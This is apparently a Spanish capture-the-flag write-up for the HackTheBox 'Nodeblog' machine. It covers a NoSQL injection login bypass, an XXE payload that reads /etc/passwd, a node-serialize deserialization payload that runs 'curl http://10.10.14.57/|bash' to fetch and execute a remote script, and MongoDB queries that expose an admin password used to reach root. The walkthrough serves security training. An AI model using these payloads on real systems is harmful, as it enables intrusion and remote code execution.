# nodeblog-HTB


## NMAP

![image](https://github.com/gecr07/nodeblog-HTB/assets/63270579/d016edfe-e784-4723-b289-ed160b1a97ec)


Encontramos una pagina que esta con express de nodejs.

![image](https://github.com/gecr07/nodeblog-HTB/assets/63270579/6047fd9a-b19d-4d73-85d4-95fb43f6a601)

Cuando tienes express vale la pena probar con json y NOSQLi cambiamos el Content-Type: application/json y ponemos user=admin&password=passwd como JSON y la respuesta nos da OK

![image](https://github.com/gecr07/nodeblog-HTB/assets/63270579/b09f9128-a806-4a35-929a-9bed6f1355c0)

Y bypaseamos el loggin es impotante hacer fallar a la base de datos para sacar informacion del proyecto.

![image](https://github.com/gecr07/nodeblog-HTB/assets/63270579/1a8158b7-a916-484d-888b-59d373b8a46d)

## RCE 

Encontramos que permite subir xml entonces me viene a la mente el XXE y si!

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>


```

Leemos el server.js en /opt/blog y nos damos cuenta que tiene un modulo node-serialize el cual es vulnerable a un RCE 



![image](https://github.com/gecr07/nodeblog-HTB/assets/63270579/406db8ad-d4a3-47e7-9b3f-04ef3e9b7dc2)


> https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

Para escalar comandos tuve problemas porque si podia mandar un ping pero la shell no use el metodo de s4vitar de curl IP|bash y funciono

```

{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.57;curl http://10.10.14.57/|bash',function(error, stdout, stderr){console.log(stdout)});}()"}
```

Antes de ponerlo en la cookie URL encodealo.

## Priv esc

Vemos que tiene la base de datos de mongo

```
mongo mongodb://localhost/blog

# Ya sabes

show dbs

use admin

show collections

db.articles.find()

db.users.find({name: "John"})

"username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
```

Ya teniendo ese password del usuario admin pues solo has sudo -l y ve que puedes corrrer cualquier comando sin y haste root.








































